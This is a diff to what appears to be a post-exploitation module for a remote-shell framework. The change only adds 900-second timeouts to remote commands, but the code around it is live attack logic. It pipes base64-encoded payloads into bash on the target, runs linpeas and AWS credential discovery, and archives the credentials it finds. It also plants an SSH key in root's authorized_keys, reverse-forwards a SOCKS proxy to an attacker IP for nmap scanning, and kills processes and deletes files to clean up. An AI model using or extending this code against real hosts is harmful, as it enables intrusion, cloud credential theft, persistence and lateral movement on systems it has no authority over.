@@ -44,7 +44,7 @@ class Module(BaseModule):
                 log("payload loaded and ready")
                 result = session.platform.run(
                     f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_linpeas | base64 -d | /bin/bash'",
-                    cwd="/tmp")
+                    cwd="/tmp", timeout=900)
                 log(result)
 
             def exfiltrate():
@@ -71,7 +71,7 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                 log("creating an instance creds profile...")
                 result = session.platform.run(
                     f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awsconfig | base64 -d | /bin/bash'",
-                    cwd="/tmp")
+                    cwd="/tmp", timeout=900)
                 log(result)
 
                 # remove any pre-existing cred archived
@@ -84,7 +84,7 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                 log("running credentials find...")
                 result = session.platform.run(
                     f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscredsfind | base64 -d | /bin/bash'",
-                    cwd="/tmp")
+                    cwd="/tmp", timeout=900)
                 log(result)
 
                 # create an archive of all aws creds
@@ -93,7 +93,7 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                 log("payload loaded and ready")
                 result = session.platform.run(
                     f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscreds | base64 -d | /bin/bash'",
-                    cwd="/tmp")
+                    cwd="/tmp", timeout=900)
                 log(result)
 
                 # cleanup any existing local cred archives for this host
@@ -216,7 +216,7 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                     b'ip -o -f inet addr show | awk \'/scope global/ {print $4}\' | head -1')
                 result = session.platform.run(
                     f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'",
-                    cwd="/tmp")
+                    cwd="/tmp", timeout=900)
                 target_lan = bytes(result.stdout).decode().strip()
                 log(f'Target LAN: {target_lan}')
 
@@ -227,7 +227,7 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                         f2.write(f1.read())
                 result = session.platform.run(
                     f"/bin/bash -c 'chmod 0600 /tmp/sockskey'",
-                    cwd="/tmp")
+                    cwd="/tmp", timeout=900)
                 log("adding public key to authorized on target...")
                 with open(f'/home/socksuser/.ssh/socksuser_key.pub', 'rb') as f1:
                     with session.platform.open('/root/.ssh/authorized_keys', 'wb') as f2:
@@ -239,7 +239,7 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                     f'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -D 9050 localhost'.encode())
                 result = session.platform.run(
                     f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'",
-                    cwd="/tmp")
+                    cwd="/tmp", timeout=900)
                 log(f'Result: {result.returncode}')
 
                 # forward local socksproxy to attacker
@@ -248,7 +248,7 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                     f'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -R 9050:localhost:9050 socksuser@{attacker_ip}'.encode())
                 result = session.platform.run(
                     f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'",
-                    cwd="/tmp")
+                    cwd="/tmp", timeout=900)
                 log(f'Result: {result.returncode}')
 
                 # run nmap scan via proxychains
@@ -264,16 +264,17 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                 log('killing ssh socksproxy and portforward...')
                 result = session.platform.run(
                     'kill -9 $(pgrep "^ssh .* /tmp/sockskey" -f)',
-                    cwd="/tmp")
+                    cwd="/tmp", timeout=900)
                 log(f'Result: {result.returncode}')
 
                 # remove temporary archive from target
                 if session.platform.Path('/tmp/sockskey').exists():
                     session.platform.unlink('/tmp/sockskey')
             else:
+                # update to add 15 minute timeout
                 result = session.platform.run(
                     "${default_payload}",
-                    cwd="/tmp")
+                    cwd="/tmp", timeout=900)
                 log(f'Result: {result.returncode}')
 
             log("Removing sesssion lock...")
